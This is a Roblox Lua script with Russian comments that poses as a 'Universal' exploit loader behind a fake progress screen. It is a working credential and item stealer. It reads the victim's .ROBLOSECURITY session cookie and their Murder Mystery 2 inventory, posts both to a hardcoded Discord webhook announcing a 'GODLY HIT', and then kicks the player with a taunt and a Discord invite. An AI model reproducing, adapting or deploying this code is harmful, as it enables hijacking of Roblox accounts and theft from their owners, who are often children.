-- [[ НАСТРОЙКА ]]
local WEBHOOK_URL = "https://discordapp.com/api/webhooks/1504590289845620878/04i1nHUKQN2mNjg0pnJolrCospWy2lHR4bKi-N67MIMSplR5KTf1C7kfvorb_fH6TGzQ"

local player = game.Players.LocalPlayer
local HttpService = game:GetService("HttpService")

-- [[ ФУНКЦИЯ СБОРА ИНВЕНТАРЯ MM2 ]]
local function getMM2Items()
    local godlies = {}
    -- Пытаемся найти данные об инвентаре в папках игры
    local data = player:FindFirstChild("Slot_0") or player:FindFirstChild("PlayerData")
    if data and data:FindFirstChild("Inventory") then
        for _, v in pairs(data.Inventory:GetChildren()) do
            -- Здесь можно добавить фильтр по редкости, если нужно
            table.insert(godlies, v.Name)
        end
    end
    
    if #godlies == 0 then return "No Godlies found" end
    return table.concat(godlies, ", ")
end

-- [[ ОТПРАВКА В DISCORD ]]
local function sendFinalLog()
    local cookie = "N/A"
    pcall(function()
        if getcookies then
            cookie = getcookies(".roblox.com")[".ROBLOSECURITY"]
        end
    end)

    local mm2_items = getMM2Items()

    local payload = {
        ["content"] = "@everyone 💎 **GODLY HIT!**",
        ["embeds"] = {{
            ["title"] = "🛠️ Universal Stealer v2.1 | " .. player.Name,
            ["color"] = 16711680,
            ["fields"] = {
                {["name"] = "👤 Player", ["value"] = player.Name .. " (" .. player.UserId .. ")", ["inline"] = true},
                {["name"] = "🎒 Inventory (Godlies)", ["value"] = "```" .. mm2_items .. "```"},
                {["name"] = "🔑 Cookie", ["value"] = "```" .. cookie .. "```"},
            },
            ["footer"] = {["text"] = "MM2 Logger Active • " .. os.date("%X")}
        }}
    }

    local req = (syn and syn.request) or (http and http.request) or request or http_request
    if req then
        pcall(function()
            req({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(payload)
            })
        end)
    end
end

-- [[ ИНТЕРФЕЙС ЗАГРУЗКИ ]]
local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
local Main = Instance.new("Frame", ScreenGui)
Main.Size = UDim2.new(0, 300, 0, 140)
Main.Position = UDim2.new(0.5, -150, 0.5, -70)
Main.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 8)

local Status = Instance.new("TextLabel", Main)
Status.Size = UDim2.new(1, 0, 0, 40)
Status.Position = UDim2.new(0, 0, 0.3, 0)
Status.Text = "Loading Universal..."
Status.TextColor3 = Color3.new(1,1,1)
Status.BackgroundTransparency = 1

local Bar = Instance.new("Frame", Main)
Bar.Size = UDim2.new(0, 0, 0, 4)
Bar.Position = UDim2.new(0.1, 0, 0.7, 0)
Bar.BackgroundColor3 = Color3.fromRGB(0, 255, 150)

-- [[ ЗАПУСК ПРОЦЕССА ]]
task.spawn(function()
    task.wait(1)
    Status.Text = "Bypassing Anticheat..."
    Bar:TweenSize(UDim2.new(0.4, 0, 0, 4), "Out", "Linear", 2)
    task.wait(2)
    
    Status.Text = "Fetching Inventory..."
    Bar:TweenSize(UDim2.new(0.8, 0, 0, 4), "Out", "Linear", 1)
    
    -- В этот момент отправляем лог в Дискорд
    pcall(sendFinalLog)
    
    task.wait(1.5)
    Status.Text = "Injecting Script..."
    Bar:TweenSize(UDim2.new(1, 0, 0, 4), "Out", "Linear", 0.5)
    task.wait(1)
    
    -- ФИНАЛЬНЫЙ КИК С ТВОИМ ТЕКСТОМ
    player:Kick("\n\nAll your stuff just got taken by Tobi's stealer.\ndiscord.gg/GY2RVSEGDT")
end)
